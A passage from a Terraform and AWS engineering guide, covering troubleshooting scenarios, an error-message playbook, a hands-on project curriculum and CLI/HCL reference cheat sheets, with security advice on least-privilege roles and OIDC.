    resources = ["*"]
  }

  statement {
    sid    = "DenyCatastrophic"
    effect = "Deny"
    actions = [
      "iam:DeleteRolePermissionsBoundary",
      "iam:DeleteOpenIDConnectProvider",
      "organizations:LeaveOrganization",
      "account:CloseAccount",
      "cloudtrail:StopLogging",
      "cloudtrail:DeleteTrail",
      "kms:ScheduleKeyDeletion",
      "s3:DeleteBucket",
    ]
    resources = ["*"]
  }

  statement {
    sid       = "RegionLock"
    effect    = "Deny"
    notactions = ["iam:*", "sts:*", "cloudfront:*", "route53:*", "organizations:*"]
    resources = ["*"]
    condition {
      test     = "StringNotEquals"
      variable = "aws:RequestedRegion"
      values   = ["ap-south-1", "us-east-1"]
    }
  }
}
```

Plus:
- A **separate read-only plan role** so the write role is only reachable through an environment gate.
- SCPs at the OU level, which the apply role cannot modify at all.
- CloudTrail alerting on IAM changes made by the apply role.

🧠 **The layered answer is the real answer.** "Least privilege on the apply role" is a goal you approach asymptotically; "the apply role cannot delete CloudTrail, cannot leave the org, cannot operate outside two regions, and cannot be assumed without an environment approval" is achievable today.

---

### Scenario 13 — The Kubernetes provider breaks on destroy

**Symptom.** `terraform destroy` on a stack containing both an EKS cluster and Helm releases:

```
Error: Kubernetes cluster unreachable: Get "https://ABC.eks.amazonaws.com/version": dial tcp: lookup ABC: no such host
```

**Cause.** Terraform destroyed the cluster first (or the cluster is already gone), and now cannot configure the Kubernetes provider to clean up the in-cluster resources still in state.

**Immediate fix.**

```bash
# Remove the unreachable in-cluster resources from state
terraform state list | grep -E '^(helm_release|kubernetes_)' \
  | xargs -n1 terraform state rm

terraform destroy
```

**Real fix.** Split the stacks (Chapter 38.2). Cluster in one, in-cluster resources in another, with the provider configured from a data source.

---

### Scenario 14 — `for_each` complains about unknown values

**Symptom.**

```
Error: Invalid for_each argument
The "for_each" value depends on resource attributes that cannot be
determined until apply.
```

**Cause.** You are iterating over something derived from a resource that does not exist yet.

**Fix.** Iterate over the input that produced it, not the output.

```hcl
# ❌
for_each = toset([for b in aws_s3_bucket.data : b.id])

# ✅
for_each = aws_s3_bucket.data       # the resource map — keys are known
bucket   = each.value.id
```

Chapter 13.4.

---

### Scenario 15 — Plans take eleven minutes and everyone avoids changes

**Symptom.** A large stack. Nobody wants to touch it. Changes get batched into big risky PRs.

**Root cause.** The state is too large (Chapter 64.4).

**What to do.**

1. **Split the state.** This is the only real fix.
2. Short term: `-refresh=false` on PR plans, paired with nightly drift detection.
3. Cache providers in CI.
4. Reduce data sources — each is an API call on every plan.

⚠️ `-parallelism=50` seems attractive and usually makes things worse through API throttling. Test before adopting.

---

### Scenario 16 — A wrong-environment apply

**Symptom.** Someone ran a dev apply against production, or a `terraform workspace select` was forgotten.

**Prevention, which is the only real answer:**

1. `allowed_account_ids` in every provider block. This alone stops most instances.
2. Directories per environment, not workspaces.
3. Separate AWS accounts per environment.
4. No human apply credentials.
5. The apply role only assumable from a matching environment-gated job.

**Recovery.** Assess what changed, then apply the correct configuration to restore it. If stateful resources were destroyed, restore from snapshot. This is why Chapter 58's layered protections exist.

---

## Chapter 75 — A Troubleshooting Playbook

Keyed by the error message you will actually see.

### `Error: Backend initialization required`

```
Error: Backend initialization required, please run "terraform init"
Reason: Backend configuration block has changed
```

The backend configuration changed since the last init.

```bash
terraform init -reconfigure     # start fresh with the new backend
terraform init -migrate-state   # copy state from the old backend to the new
```

⚠️ Know which you want. `-reconfigure` discards the backend association without moving state; `-migrate-state` copies it.

---

### `Error: Error acquiring the state lock`

Chapter 19.3. Determine whether the original process is still running **before** force-unlocking.

---

### `Error: Invalid for_each argument`

Chapter 13.4 / Scenario 14.

---

### `Error: Cycle: ...`

```
Error: Cycle: aws_security_group.a, aws_security_group.b
```

Two resources reference each other. Almost always security groups with inline rules.

**Fix:** use standalone `aws_vpc_security_group_ingress_rule` resources (Chapter 30.6).

```bash
terraform graph | dot -Tsvg > graph.svg     # visualise it
terraform graph -format=mermaid            # 🔬 Terraform 1.16+
```

---

### `Error: Provider configuration not present`

A resource in state has no provider configuration — typically because you removed a module that contained its own `provider` block.

**Fix:** temporarily restore the provider configuration, run the destroy or removal, then take it out. **Prevention:** never put `provider` blocks in reusable modules (Chapter 9.2).

---

### `Error: Inconsistent dependency lock file`

```
Error: Inconsistent dependency lock file
provider registry.terraform.io/hashicorp/aws: required by this configuration
but no version is selected
```

```bash
terraform init -upgrade
git add .terraform.lock.hcl && git commit
```

---

### `Error: Failed to install provider ... checksums did not match`

Either the lock file lacks hashes for your platform, or something is genuinely wrong.

```bash
terraform providers lock -platform=linux_amd64 -platform=darwin_arm64
```

⚠️ **If you did not change the version and this appears, treat it as a potential supply-chain event** before assuming it is a platform gap.

---

### `Error: Saved plan is stale`

The state changed between saving the plan and applying it. Re-plan. Chapter 48.3.

---

### `Error: Instance cannot be destroyed` / `Resource has lifecycle.prevent_destroy set`

The protection is working. If the destroy is genuinely intended, remove `prevent_destroy` in a reviewed PR — never with a CLI flag.

---

### `Error: ... is not authorized to perform: sts:AssumeRoleWithWebIdentity`

OIDC trust policy mismatch. Debug by printing the actual claims:

```yaml
- name: Show the OIDC subject
  run: |
    TOKEN=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
      "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r '.value')
    echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq '{sub, aud, repository, environment}'
```

Compare the printed `sub` against your trust policy character by character. ⚠️ Check for the 2026 immutable format (Chapter 46.2).

---

### `Error: creating ... AccessDenied` mid-apply

The apply role lacks a permission. Find the exact action in CloudTrail:

```bash
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=CreateSecurityGroup \
  --max-results 5 \
  --query 'Events[].CloudTrailEvent' --output text | jq '.errorCode, .errorMessage'
```

---

### `Error: Provider produced inconsistent final plan`

A provider bug: the value after apply differs from what was planned.

1. Upgrade the provider.
2. Search the provider's GitHub issues for the resource type.
3. Workaround: `ignore_changes` on the offending attribute, or set it explicitly.

---

### `Error: Unsupported block type` on a `helm_release`

You are using Helm provider v2 syntax with v3 installed (or vice versa). v3 uses `kubernetes = { ... }` as an attribute; v2 used `kubernetes { ... }` as a block. Chapter 38.2.

---

### Plan shows changes but apply says "no changes"

Usually a provider bug with `default_tags`, or an attribute set in two places. Check whether the same tag appears in both `default_tags` and the resource's `tags`.

---

### Everything is `(known after apply)`

A resource high in the graph is being replaced, so everything downstream is unknown. Find the replacement and fix that; the noise will disappear.

---

### `Error: Reference to undeclared resource` after adding a module

The module is not initialised.

```bash
terraform init
```

Also check the `source` path and, for git sources, that the `?ref=` tag exists.

---

### Debugging with `TF_LOG`

```bash
export TF_LOG=DEBUG            # TRACE, DEBUG, INFO, WARN, ERROR
export TF_LOG_PATH=./tf.log
terraform plan

# Provider-only logging — much less noise
export TF_LOG_PROVIDER=DEBUG

# Core-only
export TF_LOG_CORE=TRACE
```

⚠️ **`TF_LOG=DEBUG` logs request and response bodies, which include secrets.** Never enable it in CI without redaction, and delete the log file afterwards.

Useful greps:

```bash
grep -E 'HTTP Request|HTTP Response' tf.log | head -50
grep -i 'error' tf.log
grep 'ThrottlingException' tf.log      # are you being rate-limited?
```

---
# Part XIII — Learning Path and Reference

---

## Chapter 76 — A Progressive Curriculum with Hands-On Projects

### 76.1 The path

```mermaid
flowchart TD
    S1["Stage 1 — Foundations<br/>Ch 1-7 · Projects 1-2<br/>HCL, plan/apply, one real resource"] --> S2
    S2["Stage 2 — The language<br/>Ch 9-16 · Project 3<br/>for_each, modules, moved/import"] --> S3
    S3["Stage 3 — State<br/>Ch 17-23 · Project 4<br/>Remote backend, locking, recovery"] --> S4
    S4["Stage 4 — Real architecture<br/>Ch 24-36 · Projects 5-6<br/>VPC, ECS, RDS, ALB, secrets"] --> S5
    S5["Stage 5 — Pipeline<br/>Ch 45-52 · Project 7<br/>OIDC, plan/apply workflows, policy"] --> S6
    S6["Stage 6 — Scale and safety<br/>Ch 37-44, 53-64 · Projects 8-9<br/>Kubernetes, testing, multi-env"] --> S7
    S7["Stage 7 — Design it yourself<br/>Ch 79 · Project 10<br/>Blank repo to production"]
```

⚠️ **Every project creates real cloud resources and costs real money.** Before starting:

- Use a dedicated sandbox account, never a shared one.
- Set an AWS Budget alarm at a low threshold (₹1,000 / $15) with an email action.
- `terraform destroy` at the end of every session. Set a calendar reminder.
- The single most expensive mistake is a forgotten NAT gateway. It costs about ₹2,700/month doing nothing.

---

### Project 1 — A secure S3 bucket, done properly

**Time:** 1–2 hours. **💰 Cost:** effectively zero.

**Requirements.** Create one S3 bucket that would pass a security review.

**Architecture.** One bucket plus its five companion resources — this is the pattern for every modern S3 bucket.

**Expected behaviour.** `terraform apply` creates a private, encrypted, versioned bucket. `terraform plan` immediately afterwards shows no changes. `terraform destroy` removes everything.

**Implementation tasks.**
1. Write `terraform.tf` with `required_version = "~> 1.16.0"` and the AWS provider pinned to `~> 6.66`.
2. Use a local backend for now.
3. Create `aws_s3_bucket` with a globally-unique name built from your account ID.
4. Add `aws_s3_bucket_public_access_block` with all four settings `true`.
5. Add `aws_s3_bucket_server_side_encryption_configuration` using `aws:kms` with `bucket_key_enabled = true`.
6. Add `aws_s3_bucket_versioning`.
7. Add `aws_s3_bucket_ownership_controls` with `BucketOwnerEnforced`.
8. Add a lifecycle configuration expiring noncurrent versions after 90 days and aborting incomplete multipart uploads after 7.
9. Tag everything via `default_tags`.

**Security requirements.**
- No public access, by any path.
- Encryption at rest with a customer-managed KMS key you also create.
- `prevent_destroy` on the KMS key.

**Success criteria.**
- [ ] `terraform plan` after apply shows `No changes`.
- [ ] `aws s3api get-public-access-block` returns all four as `true`.
- [ ] An unauthenticated `curl` of an object URL returns 403.
- [ ] `checkov -d . --framework terraform` reports zero HIGH or CRITICAL findings.

**Extension challenges.**
- Add a bucket policy denying any request where `aws:SecureTransport` is false.
- Add replication to a second region and observe how many extra resources that needs.
- Convert the whole thing into a module with `examples/minimal` and `examples/complete`.

---

### Project 2 — Variables, validation and outputs

**Time:** 2 hours. **💰 Cost:** near zero.

**Requirements.** Rewrite Project 1 so nothing is hardcoded and bad inputs fail at plan time.

**Implementation tasks.**
1. Introduce `project`, `environment` and `owning_team` variables. Give `environment` no default.
2. Add validation: `environment` must be one of dev/staging/production.
3. Add validation: the bucket name suffix must be lowercase alphanumeric with hyphens, 3–40 characters.
4. Add a cross-variable validation: if `environment == "production"`, `noncurrent_version_days` must be at least 90.
5. Build `local.name_prefix` and `local.common_tags`.
6. Output the bucket name, ARN and regional domain name, each with a description.
7. Create `dev.tfvars` and `production.tfvars`.

**Success criteria.**
- [ ] `terraform plan -var-file=production.tfvars -var noncurrent_version_days=7` fails with **your** error message, not a generic one.
- [ ] `terraform plan` with no `environment` set prompts (or fails under `TF_INPUT=false`).
- [ ] `terraform-docs .` generates a complete README.

**Extension challenges.**
- Add an `object(...)` variable with `optional()` attributes and defaults.
- Add a `precondition` asserting the KMS key has rotation enabled.

---

### Project 3 — `for_each`, and proving the `count` trap

**Time:** 2–3 hours. **💰 Cost:** near zero.

**Requirements.** Demonstrate to yourself, with real state, why `count` over a list is dangerous.

**Implementation tasks.**
1. Create three IAM users with `count = length(var.users)` where `users = ["alice","bob","carol"]`.
2. Apply. Run `terraform state list` and record the addresses.
3. Remove `"bob"` from the list. **Plan but do not apply.** Read what Terraform proposes to do to carol.
4. Restore bob. Convert to `for_each = toset(var.users)`.
5. Write `moved` blocks so the conversion is a zero-change plan.
6. Apply. Verify `Plan: 0 to add, 0 to change, 0 to destroy`.
7. Now remove bob again and confirm only `["bob"]` is destroyed.

**Success criteria.**
- [ ] You can explain, from your own plan output, exactly what happens to carol in step 3.
- [ ] The `count` → `for_each` migration applied with zero changes.
- [ ] `terraform state list` shows string keys, not integers.

**Extension challenges.**
- Do the same with a `map(object(...))` where each user has a different set of policies.
- Use `for_each` on a `module` block.

---

### Project 4 — Remote state, locking, and a recovery drill

**Time:** 3–4 hours. **💰 Cost:** pennies.

**Requirements.** Build the bootstrap stack, migrate to it, then deliberately break it and recover.

**Architecture.** A state bucket with versioning, KMS encryption, public access block and `prevent_destroy`.

**Implementation tasks.**
1. Write `stacks/bootstrap` with a **local** backend. Create the KMS key and the state bucket.
2. Apply. Then add the `backend "s3"` block to the bootstrap stack itself.
3. `terraform init -migrate-state`. Answer yes. Delete the local state files.
4. Verify with `terraform plan` → `No changes`.
5. Migrate Project 1's stack to the same bucket under a different key.
6. **The drill:** delete the state object for Project 1's stack.
7. Observe that `terraform plan` now wants to create everything.
8. Recover it from S3 object versions. Verify `No changes`.

**Security requirements.**
- The bucket is not public, is encrypted with your CMK, has versioning, and carries `prevent_destroy`.
- `use_lockfile = true`.

**Success criteria.**
- [ ] Both stacks use remote state with native locking.
- [ ] You recovered from a deleted state file without importing anything.
- [ ] Two concurrent `terraform apply` runs in two terminals — the second reports a lock error.
- [ ] You can name the S3 object that implements the lock.

**Extension challenges.**
- Force-unlock a genuinely stuck lock and write down the checks you did first.
- Add a scheduled cross-region backup of the state bucket.

---

### Project 5 — A production VPC

**Time:** 4–6 hours. **💰 Cost:** ⚠️ **~₹2,700/month if you leave the NAT gateway running.** Destroy it the same day.

**Requirements.** A three-tier VPC across three AZs that a real application could run in.

**Architecture.** Public / private / database subnets per AZ, one NAT gateway, S3 and DynamoDB gateway endpoints, flow logs.

**Implementation tasks.**
1. Plan your CIDRs on paper first. Write down which /24s and /20s go where and why.
2. Use `cidrsubnet()` — do not hardcode a single subnet CIDR.
3. Use `terraform-aws-modules/vpc/aws` pinned to `~> 6.7`.
4. `single_nat_gateway = true` for this project. Understand exactly what you are trading away.
5. Add S3 and DynamoDB gateway endpoints. Note that they are free.
6. Enable flow logs to CloudWatch with 7-day retention.
7. Publish `vpc_id`, `private_subnet_ids` and `database_subnet_ids` to SSM Parameter Store.
8. Tag public subnets `Tier = public`, and so on.

**Success criteria.**
- [ ] `terraform plan` after apply: `No changes`.
- [ ] Three AZs, nine subnets, correct route tables.
- [ ] The database route table has **no** route to the NAT gateway.
- [ ] SSM parameters exist and hold the right values.
- [ ] You destroyed it before going to bed.

**Extension challenges.**
- Add interface endpoints for ECR and Secrets Manager. Calculate the break-even NAT traffic volume.
- Add a second VPC in another region and peer them.
- Work out what changing `private_subnets` CIDRs would do. **Plan only — do not apply.**

---

### Project 6 — A full containerised service

**Time:** 8–12 hours. **💰 Cost:** ⚠️ **~₹5,000–8,000/month if left running.** Use `db.t4g.micro` and destroy daily.

**Requirements.** Deploy a real containerised application end to end: internet → ALB → ECS Fargate → RDS.

**Architecture.**

```
Route53 → ACM cert → ALB (public subnets)
  → target group → ECS Fargate service (private subnets)
    → RDS PostgreSQL (database subnets)
    → Secrets Manager (password, injected by the ECS agent)
    → CloudWatch Logs
```

**Implementation tasks.**
1. Build on Project 5's VPC, reading it from SSM.
2. Create an ECR repository with a lifecycle policy.
3. Build and push a tiny container — a Spring Boot app with `/actuator/health` is ideal given your background.
4. Write `modules/ecs-service` yourself. Do not use a community module for this one; the point is to understand it.
5. Two IAM roles: execution and task. Understand precisely why.
6. RDS with `manage_master_user_password = true`.
7. Inject the password via the task definition's `secrets` block, never `environment`.
8. ACM certificate with DNS validation, using the `for_each` over `domain_validation_options` pattern.
9. Autoscaling on CPU, with asymmetric cooldowns.
10. Alarms: service CPU, ALB 5xx, unhealthy hosts.
11. `deployment_circuit_breaker` with `rollback = true`.
12. `ignore_changes = [task_definition, desired_count]`.

**Security requirements.**
- Tasks have no public IP.
- The service security group accepts traffic only from the ALB's security group.
- The database security group accepts traffic only from the service's.
- No secret value appears anywhere in state. **Verify this**: `terraform state pull | jq -r '..|strings' | grep -i password`.
- Encryption at rest on RDS and on the log group.

**Success criteria.**
- [ ] `curl https://your-domain/actuator/health` returns 200 over HTTPS.
- [ ] The RDS password is nowhere in state.
- [ ] Killing a task causes ECS to replace it automatically.
- [ ] Deploying a deliberately broken image triggers an automatic rollback.
- [ ] `terraform plan` after a manual `aws ecs update-service --desired-count 5` shows **no** diff on `desired_count`.

**Extension challenges.**
- Add a worker service consuming an SQS queue with a DLQ and an alarm.
- Add ElastiCache and wire a session store.
- Move to ARM64 and measure the cost difference.
- Add a staging environment in a separate directory, sharing the module.

---

### Project 7 — The full CI/CD pipeline

**Time:** 6–10 hours. **💰 Cost:** near zero beyond Project 6's resources.

**Requirements.** No human ever runs `terraform apply` again.

**Implementation tasks.**
1. Create the GitHub OIDC provider in AWS.
2. Create a `terraform-plan` role: `ReadOnlyAccess` plus state read/write on specific keys only.
3. Create `terraform-apply-dev` and `terraform-apply-production` roles, each with an **exact-match** `sub` condition on `environment:`.
4. Handle both the legacy and immutable `sub` formats.
5. Write the plan workflow (Chapter 47) with changed-stack discovery.
6. Add the PR comment with the add/change/destroy/**replace** table above the fold.
7. Write the apply workflow with `environment:`, `max-parallel: 1` and a concurrency group.
8. Configure GitHub environment protection: required reviewers, branch restricted to `main`.
9. Add tflint, Checkov on the plan JSON, and at least three of your own Conftest policies.
10. Add Infracost.
11. Add the nightly drift workflow that opens **and closes** issues.
12. Pin every third-party action to a 40-character SHA.
13. Add `.pre-commit-config.yaml`.

**Security requirements.**
- **Verify the boundary:** temporarily change the PR workflow to use the apply role and confirm it is denied. Then revert.
- CODEOWNERS on `.github/`.
- No long-lived AWS keys anywhere in the repository or its secrets.

**Success criteria.**
- [ ] Opening a PR produces a plan comment with a replace/destroy summary.
- [ ] Merging pauses for approval before applying to production.
- [ ] A PR adding an IAM policy with `Action: "*"` is **failed by policy**, not by a reviewer.
- [ ] A manual console change is detected by the nightly job within 24 hours and the issue closes when you fix it.
- [ ] You can explain each of the four layers stopping a malicious fork PR.

**Extension challenges.**
- Add a `workflow_dispatch` targeted apply with a typed confirmation input.
- Add a change-window check that refuses production applies at weekends.
- Add a GCP OIDC path alongside AWS.

---

### Project 8 — Kubernetes, layered correctly

**Time:** 10–15 hours. **💰 Cost:** ⚠️ **~₹12,000+/month.** EKS control plane alone is ~₹6,000. Destroy the same day.

**Requirements.** Provision EKS (or GKE) with the three-stack layering, and prove to yourself why it is necessary.

**Implementation tasks.**
1. **First, do it wrong deliberately.** One stack with the cluster *and* a `helm_release`. Apply. Then `terraform destroy` and watch it fail.
2. Recover using `terraform state rm`.
3. Now do it right: cluster stack with no Kubernetes provider at all.
4. Add-ons stack with providers configured from `data.aws_eks_cluster`, using `exec` auth — not `aws_eks_cluster_auth`.
5. Install the AWS Load Balancer Controller and cert-manager via Helm, both version-pinned, both `atomic = true`.
6. Create an IRSA (or Workload Identity) role for a workload.
7. Bootstrap ArgoCD with Terraform, then deploy an application through ArgoCD, not Terraform.
8. Publish the cluster name to SSM.

**Success criteria.**
- [ ] You experienced the destroy failure and can explain its cause.
- [ ] `terraform destroy` on the add-ons stack works cleanly, then the cluster stack does too.
- [ ] A pod assumes an AWS role and reads from S3 with no static credentials.
- [ ] Changing a Deployment in git updates the cluster with **no** Terraform run.

**Extension challenges.**
- Do the same on GKE and write down every difference you hit.
- Add Karpenter and observe the `desired_size` conflict.
- Set `ENABLE_PREFIX_DELEGATION` and compare maximum pods per node.

---

### Project 9 — Testing, policy and multi-environment

**Time:** 8–12 hours. **💰 Cost:** low, if apply-mode tests are kept small.

**Requirements.** Make your `ecs-service` module trustworthy enough for other people to use.

**Implementation tasks.**
1. Write `tests/defaults.tftest.hcl` with `mock_provider` and at least six plan-mode assertions.
2. Write `tests/validation.tftest.hcl` using `expect_failures` for three bad inputs.
3. Write one apply-mode test in a sandbox account.
4. Write five Conftest policies and test them with `conftest verify`.
5. Add `examples/minimal` and `examples/complete`.
6. Generate a README with `terraform-docs` and enforce freshness in CI.
7. Build dev, staging and production as **directories**, sharing the module.
8. Tag the module `v1.0.0` and switch all three environments to `?ref=v1.0.0`.
9. Make a breaking internal rename, ship a `moved` block, release `v2.0.0`, and roll it out dev → staging → production.

**Success criteria.**
- [ ] `terraform test` passes and covers both success and failure paths.
- [ ] The `v1.0.0` → `v2.0.0` upgrade plans zero changes in every environment.
- [ ] CI fails if the README is stale.
- [ ] Production and dev differ **only** in their tfvars.

**Extension challenges.**
- Add a Terratest that polls the real endpoint.
- Add a nightly workflow running apply-mode tests in a sandbox.

---

### Project 10 — Blank repository to production

**Time:** 20–30 hours, spread over weeks. **💰 Cost:** manage carefully.

**Requirements.** Follow Chapter 79 from an empty directory. Design and build the whole thing yourself, making and documenting every decision.

**Success criteria.**
- [ ] A new engineer can deploy a new service by copying a template and editing three values.
- [ ] No human has standing apply credentials.
- [ ] You can recover from a deleted state file in under fifteen minutes, following your own runbook.
- [ ] A written ADR exists for each of: state layout, environment strategy, cross-stack dependencies, the Terraform/CD boundary.
- [ ] Someone else reviewed it and could not find a critical issue.

---

## Chapter 77 — Cheat Sheets

### 77.1 CLI

```bash
# Lifecycle
terraform init                          # download providers, configure backend
terraform init -upgrade                 # re-resolve version constraints
terraform init -reconfigure             # new backend, do not migrate state
terraform init -migrate-state           # new backend, copy state across
terraform init -backend=false           # modules only; no backend (for validate in CI)
terraform init -backend-config=env.hcl

terraform validate                      # syntax and internal consistency
terraform fmt -recursive -check -diff

terraform plan
terraform plan -out=tfplan
terraform plan -detailed-exitcode       # 0 none, 1 error, 2 changes
terraform plan -refresh=false           # skip refresh (fast, may miss drift)
terraform plan -generate-config-out=g.tf
terraform plan -var-file=prod.tfvars -var 'name=api'

terraform apply tfplan
terraform apply -auto-approve
terraform apply -replace=aws_instance.web
terraform apply -refresh-only           # reconcile state to reality, change nothing
terraform apply -target=module.x        # ⚠️ recovery only
terraform apply -lock-timeout=10m
terraform apply -parallelism=10

terraform destroy
terraform destroy -target=module.x

# State
terraform state list
terraform state list 'module.db.*'
terraform state show aws_db_instance.main
terraform state pull > backup.tfstate
terraform state push state.tfstate
terraform state mv A B
terraform state mv -state-out=other.tfstate A A
terraform state rm A                    # ⚠️ prefer a removed block
terraform state replace-provider OLD NEW
terraform force-unlock LOCK_ID

# Inspection
terraform output
terraform output -json
terraform output -raw db_endpoint
terraform show
terraform show -json tfplan > plan.json
terraform graph | dot -Tsvg > graph.svg
terraform graph -format=mermaid         # 🔬 1.16+
terraform providers
terraform providers lock -platform=linux_amd64 -platform=darwin_arm64
terraform version

# Testing
terraform test
terraform test -filter=defaults.tftest.hcl -verbose

# Workspaces (for ephemeral copies, NOT environments)
terraform workspace list
terraform workspace new pr-123
terraform workspace select pr-123
terraform workspace delete pr-123
```

### 77.2 Environment variables

```bash
TF_VAR_name=value           # sets var.name
TF_LOG=DEBUG                # TRACE DEBUG INFO WARN ERROR
TF_LOG_PATH=./tf.log
TF_LOG_PROVIDER=DEBUG       # provider only — much less noise
TF_LOG_CORE=TRACE
TF_IN_AUTOMATION=true       # suppress "next step" hints
TF_INPUT=false              # never prompt
TF_CLI_ARGS="-no-color"
TF_CLI_ARGS_plan="-lock-timeout=10m"
TF_DATA_DIR=.terraform
TF_PLUGIN_CACHE_DIR=~/.terraform.d/plugin-cache
TF_WORKSPACE=production     # ⚠️ overrides the selected workspace
TF_TOKEN_app_terraform_io=...
```

### 77.3 HCL syntax

```hcl
terraform {
  required_version = "~> 1.16.0"
  required_providers {
    aws = { source = "hashicorp/aws", version = "~> 6.66" }
  }
  backend "s3" { }
}

provider "aws" { alias = "west", region = "us-west-2" }

variable "x" {
  type        = string
  description = "..."
  default     = null
  sensitive   = false
  nullable    = true
  validation { condition = ..., error_message = "..." }
}

locals { y = "..." }

output "z" {
  value       = ...
  description = "..."
  sensitive   = false
  depends_on  = []
  precondition { condition = ..., error_message = "..." }
}

resource "type" "name" {
  count    = 1                      # OR
  for_each = { k = v }
  provider = aws.west
  depends_on = [other.thing]

  lifecycle {
    create_before_destroy = true
    prevent_destroy       = true
    ignore_changes        = [tags["x"]]
    replace_triggered_by  = [other.thing.id]
    precondition  { condition = ..., error_message = "..." }
    postcondition { condition = self.x, error_message = "..." }
  }

  dynamic "block" {
    for_each = var.items
    content { name = block.value.name }
  }
}

data "type" "name" { }

module "m" {
  source   = "./path"               # or registry, or git::...?ref=
  version  = "~> 1.0"               # registry only
  for_each = {}
  providers = { aws = aws.west }
}

moved   { from = a.b, to = a.c }
import  { to = a.b, id = "xyz" }
removed { from = a.b, lifecycle { destroy = false } }
check "name" { assert { condition = ..., error_message = "..." } }

ephemeral "type" "name" { }         # 🔬 1.10+
```

**Type constraints**

```hcl
string  number  bool  any
list(T)  set(T)  map(T)
tuple([string, number])
object({ a = string, b = optional(number, 5) })
```

### 77.4 Functions by task

```hcl
# Strings
format("%s-%s", a, b)      formatlist("%s!", list)
join(",", list)            split(",", s)
replace(s, "/x/", "y")     trimspace(s)   trimprefix(s, "p")
lower(s) upper(s) title(s) substr(s, 0, 5)
startswith(s,"a") endswith(s,"z") strcontains(s,"m")
regex("^a(.)c$", s)        regexall(p, s)

# Collections
length(x)  keys(m)  values(m)  merge(a, b)  lookup(m, k, default)
contains(l, v)  concat(a, b)  flatten(ll)  distinct(l)  reverse(l)
toset(l)  tolist(s)  tomap(o)  zipmap(keys, vals)
slice(l, 0, 3)  chunklist(l, 5)  setsubtract(a, b)  setintersection(a,b)
coalesce(a, b, c)  coalescelist(a, b)  one(l)  compact(l)
alltrue(l)  anytrue(l)  sum(l)  min(...)  max(...)
element(l, i)  index(l, v)  range(0, 3)

# Encoding
jsonencode(x)  jsondecode(s)  yamlencode(x)  yamldecode(s)
base64encode(s)  base64decode(s)  base64gzip(s)
urlencode(s)  textencodebase64(s, "UTF-8")

# Files
file(path)  fileexists(path)  filebase64(path)
templatefile(path, vars)  templatestring(s, vars)   # 🔬 1.9+
fileset(path, pattern)  dirname(p)  basename(p)  abspath(p)

# Network
cidrsubnet("10.0.0.0/16", 8, 2)     # 10.0.2.0/24
cidrsubnets("10.0.0.0/16", 8, 8, 4)
cidrhost("10.0.0.0/24", 5)          # 10.0.0.5
cidrnetmask("10.0.0.0/24")          # 255.255.255.0

# Type / error handling
can(expr)          # bool — did it evaluate without error?
try(a, b, c)       # first that succeeds
sensitive(v)  nonsensitive(v)  issensitive(v)
tostring(v) tonumber(v) tobool(v) type(v)

# Hash / random
md5(s) sha1(s) sha256(s) sha512(s)
filesha256(path)  uuid()  uuidv5(ns, name)  bcrypt(s)

# Date
timestamp()        # ⚠️ changes every plan
plantimestamp()    # 🔬 fixed for the duration of the plan
timeadd(t, "24h")  timecmp(a, b)  formatdate("YYYY-MM-DD", t)

# Paths
path.module  path.root  path.cwd
terraform.workspace
```

### 77.5 Version constraint operators

```hcl
version = "6.66.0"        # exactly
version = ">= 6.0"        # at least
version = "~> 6.66"       # >= 6.66.0, < 7.0.0   (rightmost-but-one may increment)
version = "~> 6.66.0"     # >= 6.66.0, < 6.67.0
version = ">= 6.0, < 7.0"
version = "!= 6.57.0"     # exclude a known-bad release
```

### 77.6 Backend quick reference

```hcl
backend "s3" {
  bucket = "..."   key = "..."   region = "..."
  encrypt = true   kms_key_id = "..."   use_lockfile = true
  role_arn = "..."   # assume a role for state access
}

backend "gcs" {
  bucket = "..."   prefix = "..."
  impersonate_service_account = "..."
}

backend "azurerm" {
  resource_group_name = "..."   storage_account_name = "..."
  container_name = "..."   key = "..."   use_oidc = true
}

cloud {
  organization = "..."
  workspaces { name = "..." }    # or: tags = ["app", "prod"]
}
```

### 77.7 GitHub Actions + Terraform patterns

```yaml
permissions:
  contents: read
  id-token: write          # OIDC
  pull-requests: write     # to comment

concurrency:
  group: tf-${{ matrix.stack }}
  cancel-in-progress: false      # ⚠️ never true for apply

env:
  TF_IN_AUTOMATION: "true"
  TF_INPUT: "false"

steps:
  - uses: hashicorp/setup-terraform@v4
    with:
      terraform_version: "1.16.4"
      terraform_wrapper: false      # ⚠️ needed for tee / PIPESTATUS

  - uses: aws-actions/configure-aws-credentials@v6
    with:
      role-to-assume: arn:aws:iam::123:role/terraform-plan
      aws-region: ap-south-1
      role-session-name: tf-${{ github.actor }}-${{ github.run_id }}

  - uses: google-github-actions/auth@v3
    with:
      workload_identity_provider: projects/.../providers/github
      service_account: tf@project.iam.gserviceaccount.com

  # Detailed exit code, captured safely
  - id: plan
    continue-on-error: true
    run: |
      set -o pipefail
      terraform plan -out=tfplan -detailed-exitcode 2>&1 | tee plan.txt
      echo "exitcode=${PIPESTATUS[0]}" >> "$GITHUB_OUTPUT"

  # Environment gate — also produces the OIDC environment claim
  environment: production
```

### 77.8 Plan analysis with `jq`

```bash
terraform show -json tfplan > plan.json

# Counts
jq '[.resource_changes[]|select(.change.actions[0]=="create")]|length' plan.json
jq '[.resource_changes[]|select(.change.actions|contains(["delete"]))]|length' plan.json

# Replacements — the number that matters most
jq -r '.resource_changes[]
  | select(.change.actions==["delete","create"] or .change.actions==["create","delete"])
  | .address' plan.json

# Why is it being replaced?
jq -r '.resource_changes[]
  | select(.change.replace_paths != null)
  | "\(.address): \(.change.replace_paths)"' plan.json

# Stateful resources touched
jq -r '.resource_changes[]
  | select(.type|test("db_instance|rds_cluster|s3_bucket|elasticache|kms_key"))
  | select(.change.actions!=["no-op"])
  | "\(.change.actions|join(",")) \(.address)"' plan.json

# Compact overview
jq -r '.resource_changes[]|select(.change.actions!=["no-op"])
  | "\(.change.actions|join("/")) \(.address)"' plan.json | sort | uniq -c
```

### 77.9 `TF_LOG` debugging

```bash
TF_LOG=DEBUG TF_LOG_PATH=./tf.log terraform plan
TF_LOG_PROVIDER=DEBUG terraform apply      # provider only
grep -E 'HTTP Request|HTTP Response' tf.log | head -50
grep -i 'ThrottlingException\|RequestLimitExceeded' tf.log
```

⚠️ Debug logs contain request bodies, and therefore secrets. Never enable in CI unredacted; delete the file afterwards.

---

## Chapter 78 — Production Checklists

